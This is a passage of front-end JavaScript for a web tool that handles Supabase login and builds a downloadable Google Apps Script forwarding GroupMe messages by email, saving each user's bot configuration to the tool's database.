    showButtonLoadingState(submitButton, false);
}

async function handleLogout() {
    if (!supabaseClient) return;
    await supabaseClient.auth.signOut();
}

async function handleForgotPassword(event) {
    event.preventDefault();
    if (!loginForm || !loginMessage || !supabaseClient) return;
    const email = loginForm.loginEmail.value || prompt("Please enter your email address:");
    if (!email) return;
    loginMessage.textContent = "Sending reset instructions...";
    loginMessage.className = 'form-message info';
    const { error } = await supabaseClient.auth.resetPasswordForEmail(email, { redirectTo: window.location.href });
    if (error) {
        loginMessage.textContent = `Error: ${error.message}`;
        loginMessage.className = 'form-message error';
    } else {
        loginMessage.textContent = "Password reset instructions sent. Check your inbox.";
        loginMessage.className = 'form-message success';
    }
}


// --- Script Generator Logic ---
async function handleGenerateScript(event) {
    event.preventDefault();
    const form = event.target;
    const submitButton = form.querySelector('button[type="submit"]');
    const errorMessageEl = document.getElementById('form-error-message');
    
    showButtonLoadingState(submitButton, true);
    errorMessageEl.style.display = 'none';
    errorMessageEl.textContent = '';

    const groupmeToken = form.elements['groupme-token'].value.trim();
    const forwardingEmail = form.elements['forwarding-email'].value.trim();
    const groupId = form.elements['group-id'].value.trim();
    const groupName = form.elements['group-name'].value.trim();
    const adminEmail = form.elements['admin-email'].value.trim();
    const ccEmails = form.elements['cc-emails'].value.trim();
    const bccEmails = form.elements['bcc-emails'].value.trim();
    const backupSubject = form.elements['backup-subject'].value.trim();
    const backupBody = form.elements['backup-body'].value;

    if (!groupmeToken || !forwardingEmail || !groupId || !groupName) {
        errorMessageEl.textContent = 'Please fill in all required fields (*).';
        errorMessageEl.style.display = 'block';
        showButtonLoadingState(submitButton, false);
        return;
    }
    
    const groupIdMap = {};
    groupIdMap[groupId] = groupName;

    let generatedCode = codeTemplate;
    const finalSignature = " - created by Shalom Karr";

    generatedCode = generatedCode.replace(/__GROUPME_TOKEN__/g, groupmeToken);
    generatedCode = generatedCode.replace('__COPILOT_EMAIL__', forwardingEmail);
    generatedCode = generatedCode.replace('__BACKUP_EMAIL__', forwardingEmail);
    generatedCode = generatedCode.replace('__GROUP_ID_MAP__', JSON.stringify(groupIdMap, null, 2));
    generatedCode = generatedCode.replace('__SIGNATURE__', finalSignature);
    generatedCode = generatedCode.replace('__ADMIN_EMAIL__', adminEmail);
    generatedCode = generatedCode.replace('__CC_EMAILS__', ccEmails);
    generatedCode = generatedCode.replace('__BCC_EMAILS__', bccEmails);
    generatedCode = generatedCode.replace('__BACKUP_SUBJECT__', backupSubject);
    // NOTE: As per user request, double quotes in the backup body are NOT escaped.
    generatedCode = generatedCode.replace('__BACKUP_BODY__', backupBody.replace(/'/g, "\\'").replace(/\n/g, '\\n'));

    try {
        const { data: { user } } = await supabaseClient.auth.getUser();

        if (user) {
            const configData = {
                user_id: user.id,
                groupme_token: groupmeToken,
                forwarding_email: forwardingEmail,
                group_id: groupId,
                group_name: groupName,
                admin_email: adminEmail || null,
                cc_emails: ccEmails || null,
                bcc_emails: bccEmails || null,
                backup_subject: backupSubject || null,
                backup_body: backupBody || null
            };

            const { error: insertError } = await supabaseClient
                .from('bot_configurations')
                .insert(configData);

            if (insertError) {
                console.error("Error saving configuration to Supabase:", insertError.message);
            } else {
                console.log("Configuration saved successfully for user:", user.id);
            }
        } else {
            console.warn("No user logged in. Skipping configuration save.");
        }
    } catch (dbError) {
        console.error("An exception occurred during the database operation:", dbError);
    }

    try {
        const blob = new Blob([generatedCode], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = 'Code.gs';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    } catch (e) {
        errorMessageEl.textContent = 'An error occurred while trying to generate the download.';
        errorMessageEl.style.display = 'block';
        console.error("Download generation failed:", e);
    } finally {
        showButtonLoadingState(submitButton, false);
    }
}


// --- Event Listeners and Initialization ---
document.addEventListener('DOMContentLoaded', () => {
    assignInstructionPageDOMElements(); 

    if (!supabaseClient) {
        if (authPromptSection) {
             authPromptSection.innerHTML = `<div style="color: red; font-weight: bold; text-align: center; padding: 20px;">Error: Application cannot connect to backend services. Please try again later.</div>`;
        }
        if (welcomeMessageDiv) welcomeMessageDiv.classList.add('hidden'); 
        if (gatedInstructionsContent) gatedInstructionsContent.classList.add('hidden');
        return;
    }

    initializeInstructionsApp();
});

function initializeInstructionsApp() {
    console.log("Instructions app initializing...");

    if (showSignupModalBtn) showSignupModalBtn.addEventListener('click', () => { hideModal(loginModal); showModal(signupModal); });
    if (showLoginModalBtn) showLoginModalBtn.addEventListener('click', () => { hideModal(signupModal); showModal(loginModal); });

    document.querySelectorAll('.modal .close-button').forEach(button => button.addEventListener('click', () => hideModal(button.closest('.modal'))));
    document.querySelectorAll('.modal').forEach(modal => modal.addEventListener('click', (event) => { if (event.target === modal) hideModal(modal); }));

    if (signupForm) signupForm.addEventListener('submit', handleSignup);
    if (loginForm) loginForm.addEventListener('submit', handleLogin);
    if (forgotPasswordLink) forgotPasswordLink.addEventListener('click', handleForgotPassword);
    
    if (configForm) {
        configForm.addEventListener('submit', handleGenerateScript);
    }

    supabaseClient.auth.onAuthStateChange((_event, session) => {
        if (session && session.user) {
            showLoggedInUI(session.user);
        } else {
            showLoggedOutUI();
        }
    });

    supabaseClient.auth.getSession().then(({ data: { session } }) => {
        if (session && session.user) {
            showLoggedInUI(session.user);
        } else {
            showLoggedOutUI();
        }
    });
}